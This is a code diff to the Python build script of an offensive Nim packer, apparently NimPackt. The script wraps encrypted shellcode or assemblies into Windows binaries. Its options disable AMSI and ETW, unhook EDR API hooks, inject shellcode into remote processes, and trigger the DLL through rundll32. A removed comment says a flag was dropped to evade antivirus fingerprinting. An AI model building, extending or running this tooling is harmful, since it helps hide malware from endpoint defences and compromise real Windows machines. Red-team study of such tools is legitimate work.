@@ -205,9 +205,7 @@ def compileNim(fileName, fileType, executionMode, localInject, showConsole, unho
         gui = "gui"
 
     try:
-        # Removed compile-time size optimization to evade some AV fingerprinting
-        #compileCommand = f"nim c -d:danger -d:strip -d:release --hints:off --warnings:off --opt:size --maxLoopIterationsVM:100000000 --app:{gui} --cpu={cpu}"
-        compileCommand = f"nim c -d:strip -d:release --hints:off --warnings:off --maxLoopIterationsVM:100000000 --app:{gui} --cpu={cpu}"
+        compileCommand = f"nim c -d:strip -d:release --opt:size --passl:-flto --hints:off --warnings:off --app:{gui} --cpu={cpu}"
 
         if useSyscalls:
             compileCommand = compileCommand + " -d:syscalls"
@@ -265,7 +263,7 @@ def compileNim(fileName, fileType, executionMode, localInject, showConsole, unho
     print(f"Compiled Nim binary to {outFileName}!")
     print(f"SHA1 hash of file to use as IOC: {getSha1Sum(outFileName)}")
     if fileType == "dll":
-        print(f"Trigger dll by calling 'rundll32 {os.path.basename(outFileName)},Update'")
+        print(f"Trigger dll by calling 'rundll32 {os.path.basename(outFileName)},IconSrv'")
     print("Go forth and make a Nimpackt that matters \N{smiling face with sunglasses}")
     
 
@@ -283,7 +281,7 @@ if __name__ == "__main__":
     assembly.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)')
     assembly.add_argument('-ne', '--nodisableetw', action='store_false', default=True, dest='disableEtw', help='Do NOT disable Event Tracing for Windows (ETW)')
     injection.add_argument('-r', '--remote', action='store_false', dest='localinject', default=True, help='Inject shellcode into remote process (default false)')
-    injection.add_argument('-t', '--target', action='store', dest='injecttarget', default="explorer.exe", help='Remote thread targeted for remote process injection (default "explorer.exe", implies -r)')
+    injection.add_argument('-t', '--target', action='store', dest='injecttarget', help='Remote thread targeted for remote process injection')
     injection.add_argument('-E', '--existing', action='store_true', dest='existingprocess', default=False, help='Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)')
     optional.add_argument('-o', '--outfile', action='store', dest='outputfile', help='Filename of the output file (e.g. "LegitBinary"). Specify WITHOUT extension or path. This property will be stored in the output binary as the original filename')
     optional.add_argument('-nu', '--nounhook', action='store_false', default=True, dest='unhookApis', help='Do NOT unhook user-mode API hooks in the target process by loading a fresh NTDLL.dll')
@@ -294,7 +292,7 @@ if __name__ == "__main__":
     optional.add_argument('-S', '--showConsole', action='store_true', default=False, dest='showConsole', help='Show a console window with the app\'s output when running')
     optional.add_argument('-d', '--debug', action='store_true', default=False, dest='debug', help='Enable debug mode (retains .nim source file in output folder)')
     optional.add_argument('-v', '--verbose', action='store_true', default=False, dest='verbose', help='Print debug messages of the wrapped binary at runtime')
-    optional.add_argument('-V', '--version', action='version', version='%(prog)s 2.2 "EDR Evasion Boogaloo"')
+    optional.add_argument('-V', '--version', action='version', version='%(prog)s v1.0 "I should learn how to code"-edition')
 
     args = parser.parse_args()
 
@@ -323,12 +321,17 @@ if __name__ == "__main__":
     if args.x64 == False and args.unhookApis == True:
         raise SystemExit("ERROR: Unhooking APIs is not supported in x86. Change to x64 or disable unhooking with -nu.")
 
-    if args.executionmode == "shinject" and (args.injecttarget != "explorer.exe" or args.existingprocess == True):
+    if args.executionmode == "shinject" and (args.injecttarget is not None or args.existingprocess == True):
         args.localinject = False
 
     if args.executionmode == "shinject":
         args.patchAmsi = False
         args.disableEtw = False
+
+    # Fix an optimization bug preventing injections from working
+    # This has opsec implications, obviously. Left as exercise to the reader ;)
+    if args.localinject == False and args.useSyscalls == True:
+        args.verbose = True
 
     cryptedInput, cryptedCoat, cryptIV, cryptKey = cryptFiles(args.inputfile, args.unhookApis, args.x64)
 
